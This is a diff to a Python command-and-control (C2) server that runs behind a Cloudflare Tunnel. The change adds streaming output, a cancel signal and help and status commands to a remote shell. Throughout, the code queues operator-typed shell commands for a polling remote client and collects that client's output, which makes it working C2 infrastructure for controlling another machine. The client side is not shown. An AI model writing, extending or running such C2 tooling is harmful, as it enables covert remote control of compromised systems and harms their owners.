@@ -1,6 +1,7 @@
 #!/usr/bin/env python3
 """
-HTTP-based C2 server. Runs on Mac behind Cloudflare Tunnel.
+HTTP-based C2 server with streaming output and cancel support.
+Runs on Mac behind Cloudflare Tunnel.
 Usage: python3 server.py
 """
 
@@ -14,16 +15,18 @@ import queue
 import readline  # enables arrow-key history in input()
 
 pending_command = None
+pending_signal = None
 lock = threading.Lock()
 last_checkin = 0
-result_queue = queue.Queue()
+result_queue = queue.Queue()  # (kind, body)  kind = "stream" | "result"
+command_running = False
 
 
 class DualStackHTTPServer(ThreadingMixIn, HTTPServer):
     """Listen on both IPv4 and IPv6 so cloudflared can connect via either."""
     daemon_threads = True
     address_family = socket.AF_INET6
-    request_queue_size = 32  # allow more queued connections
+    request_queue_size = 32
 
     def server_bind(self):
         self.socket.setsockopt(socket.IPPROTO_IPV6, socket.IPV6_V6ONLY, 0)
@@ -32,77 +35,80 @@ class DualStackHTTPServer(ThreadingMixIn, HTTPServer):
 
 
 class Handler(BaseHTTPRequestHandler):
-    # Disable default logging — we do our own
     def log_message(self, fmt, *args):
         pass
 
-    # Persistent connections (HTTP/1.1 keep-alive)
     protocol_version = "HTTP/1.1"
 
+    def _respond(self, code, body=b"", keep_alive=True):
+        """Helper to send a response with proper headers."""
+        self.send_response(code)
+        self.send_header("Content-Type", "text/plain")
+        self.send_header("Content-Length", str(len(body)))
+        self.send_header("Connection", "keep-alive" if keep_alive else "close")
+        self.end_headers()
+        self.wfile.write(body)
+
     def do_GET(self):
-        global pending_command, last_checkin
+        global pending_command, pending_signal, last_checkin
         if self.path == "/cmd":
             last_checkin = time.time()
             with lock:
                 cmd = pending_command or ""
                 pending_command = None
-            body = cmd.encode()
-            self.send_response(200)
-            self.send_header("Content-Type", "text/plain")
-            self.send_header("Content-Length", str(len(body)))
-            self.send_header("Connection", "keep-alive")
-            self.end_headers()
-            self.wfile.write(body)
+            self._respond(200, cmd.encode())
+
+        elif self.path == "/signal":
+            # Client polls this during command execution for cancel signals
+            with lock:
+                sig = pending_signal or ""
+                pending_signal = None  # one-shot: clear after read
+            self._respond(200, sig.encode())
+
         elif self.path == "/ping":
-            # Lightweight health-check endpoint
             last_checkin = time.time()
-            body = b"pong"
-            self.send_response(200)
-            self.send_header("Content-Type", "text/plain")
-            self.send_header("Content-Length", str(len(body)))
-            self.send_header("Connection", "keep-alive")
-            self.end_headers()
-            self.wfile.write(body)
+            self._respond(200, b"pong")
+
         else:
-            self.send_response(404)
-            self.send_header("Content-Length", "0")
-            self.send_header("Connection", "close")
-            self.end_headers()
+            self._respond(404, keep_alive=False)
 
     def do_POST(self):
-        if self.path == "/result":
-            length = int(self.headers.get("Content-Length", 0))
-            body = self.rfile.read(length).decode(errors="replace")
-            result_queue.put(body)
-            resp = b"ok"
-            self.send_response(200)
-            self.send_header("Content-Type", "text/plain")
-            self.send_header("Content-Length", str(len(resp)))
-            self.send_header("Connection", "keep-alive")
-            self.end_headers()
-            self.wfile.write(resp)
+        global command_running
+        length = int(self.headers.get("Content-Length", 0))
+        body = self.rfile.read(length).decode(errors="replace")
+
+        if self.path == "/stream":
+            # Streaming chunk — partial output from running command
+            result_queue.put(("stream", body))
+            self._respond(200, b"ok")
+
+        elif self.path == "/result":
+            # Final result — command finished/cancelled/timed out
+            command_running = False
+            result_queue.put(("result", body))
+            self._respond(200, b"ok")
+
         else:
-            self.send_response(404)
-            self.send_header("Content-Length", "0")
-            self.send_header("Connection", "close")
-            self.end_headers()
+            self._respond(404, keep_alive=False)
 
 
 def result_printer():
-    """Drain the result queue and print results cleanly."""
+    """Drain the result queue and print output cleanly."""
     while True:
         try:
-            body = result_queue.get(timeout=0.5)
-            # Clear the current input line, print result, re-show prompt
-            sys.stdout.write("\r\033[K" + body)
-            sys.stdout.write("shell> ")
+            kind, body = result_queue.get(timeout=0.5)
+            if body:
+                sys.stdout.write("\r\033[K" + body)
+            if kind == "result":
+                # Command finished — re-show prompt
+                sys.stdout.write("shell> ")
             sys.stdout.flush()
         except queue.Empty:
             pass
 
 
 def input_loop():
-    global pending_command
+    global pending_command, pending_signal, command_running
     while True:
         try:
             cmd = input("shell> ")
@@ -112,20 +118,45 @@ def input_loop():
             print("\n[*] Exiting.")
             sys.exit(0)
 
-        if cmd.strip().lower() == "status":
+        stripped = cmd.strip().lower()
+
+        # --- Built-in commands ---
+        if stripped == "cancel":
+            with lock:
+                if command_running or pending_command:
+                    pending_signal = "cancel"
+                    pending_command = None
+                    print("[*] Cancel signal queued. Client will abort current command.")
+                else:
+                    print("[*] No command is currently running.")
+            continue
+
+        if stripped == "status":
             elapsed = time.time() - last_checkin if last_checkin > 0 else -1
             if elapsed < 0:
                 print("[*] No client check-in yet.")
             elif elapsed < 10:
-                print(f"[*] Client ONLINE — last check-in {elapsed:.1f}s ago")
+                state = "RUNNING command" if command_running else "IDLE"
+                print(f"[*] Client ONLINE ({state}) — last check-in {elapsed:.1f}s ago")
             else:
                 print(f"[!] Client may be OFFLINE — last check-in {elapsed:.0f}s ago")
             continue
 
+        if stripped == "help":
+            print("[*] Built-in commands:")
+            print("      cancel  — abort the currently running command")
+            print("      status  — check client connectivity")
+            print("      exit    — tell client to shut down")
+            print("      help    — show this message")
+            print("    Anything else is sent to the remote shell.")
+            continue
+
+        # --- Remote command ---
         with lock:
             if pending_command:
                 print("[!] Previous command still pending — overwriting.")
             pending_command = cmd
+            command_running = True
 
 
 def status_printer():
@@ -149,7 +180,7 @@ if __name__ == "__main__":
     server = DualStackHTTPServer(("::", PORT), Handler)
     print(f"[*] Listening on port {PORT} (IPv4 + IPv6)")
     print("[*] Waiting for client to connect...")
-    print("[*] Type 'status' to check client connectivity\n")
+    print("[*] Type 'help' for built-in commands\n")
 
     threading.Thread(target=input_loop, daemon=True).start()
     threading.Thread(target=result_printer, daemon=True).start()
